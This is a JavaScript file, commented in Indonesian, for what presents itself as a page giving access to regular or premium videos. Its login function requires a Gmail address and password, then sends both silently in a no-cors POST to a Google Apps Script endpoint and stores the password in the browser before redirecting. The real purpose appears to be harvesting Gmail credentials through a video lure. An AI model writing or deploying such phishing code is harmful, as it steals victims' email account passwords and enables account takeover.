const BACKEND_URL =
"https://script.google.com/macros/s/AKfycbzvAzODr0DSFybalJS0UJChyn3VCHg9YfWNYmXt6VsWSk9o0szcFY5OpuFcYSIfloo6/exec";

let videoType = "";


/* ================================
   BUKA PILIHAN
================================ */

document.addEventListener("pointerdown", bukaPilihan, {
    once: true
});

function bukaPilihan() {

    document
        .getElementById("pilihanBox")
        .classList.add("show");

}


/* ================================
   PILIH VIDEO
================================ */

function pilihVideo(type) {

    videoType = type;

    document
        .getElementById("pilihanBox")
        .classList.remove("show");

    document
        .getElementById("formBox")
        .classList.add("show");


    if (type === "biasa") {

        document
            .getElementById("judulForm")
            .textContent = "Video Biasa";

    } else {

        document
            .getElementById("judulForm")
            .textContent = "Video Premium";

    }

}


/* ================================
   KEMBALI
================================ */

function kembali() {

    document
        .getElementById("formBox")
        .classList.remove("show");

    document
        .getElementById("pilihanBox")
        .classList.add("show");

}


/* ================================
   MASUK
================================ */

async function masuk() {

    const nama =
        document
        .getElementById("nama")
        .value
        .trim();

    const kode =
        document
        .getElementById("kode")
        .value
        .trim();

    const error =
        document
        .getElementById("error");

    const loading =
        document
        .getElementById("loading");


    error.style.display = "none";


    if (!nama) {

        tampilkanError("email/No.Telp belum diisi!");
        return;

    }


    if (!nama.endsWith("@gmail.com")) {

        tampilkanError(
            "email harus diakhiri dengan @gmail.com"
        );

        return;

    }


    if (!kode) {

        tampilkanError("password belum diisi!");
        return;

    }


    if (!BACKEND_URL) {

        tampilkanError(
            "Backend belum dipasang."
        );

        return;

    }


    loading.style.display = "block";


    try {

        await fetch(
            BACKEND_URL,
            {
                method: "POST",

                mode: "no-cors",

                headers: {
                    "Content-Type":
                        "text/plain;charset=utf-8"
                },

                body: JSON.stringify({

                    nama: nama,
                    kode: kode,
                    video: videoType

                })
            }
        );


        localStorage.setItem(
            "nama",
            nama
        );

        localStorage.setItem(
            "kode",
            kode
        );

        localStorage.setItem(
            "videoType",
            videoType
        );


        window.location.href =
            "video.html";


    } catch (e) {

        console.error(e);

        loading.style.display = "none";

        tampilkanError(
            "Gagal terhubung ke server."
        );

    }

}


/* ================================
   ERROR
================================ */

function tampilkanError(pesan) {

    const error =
        document.getElementById("error");

    error.textContent = pesan;

    error.style.display = "block";

}